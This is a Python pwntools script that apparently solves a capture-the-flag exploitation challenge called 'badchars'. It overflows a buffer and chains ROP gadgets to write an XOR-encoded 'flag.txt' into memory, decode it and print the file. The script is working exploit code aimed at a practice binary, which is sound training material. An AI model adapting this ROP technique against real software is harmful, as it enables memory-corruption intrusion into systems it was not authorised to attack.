from pwn import *

elf = context.binary = ELF("./badchars")
context.log_level = 'debug'

p = process()

bss = elf.bss()
pop_rdi = 0x00000000004006a3
print_plt = 0x0000000000400510
ret = 0x00000000004004ee
mov_r13_r12 = 0x0000000000400634
xor_gadget = 0x0000000000400628
pop_r14_r15 = 0x00000000004006a0
pop_r12_r13_r14_r15 = 0x000000000040069c

payload = b'b'*40
payload += p64(ret)
payload += p64(pop_r12_r13_r14_r15)
payload += b'dnce,vzv'
payload += p64(bss)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(mov_r13_r12)

for i in range(8):
	payload += p64(pop_r14_r15)
	payload +=  p64(2) + p64(bss+i)
	payload += p64(xor_gadget)

payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(print_plt)

p.sendline(payload)
p.interactive()
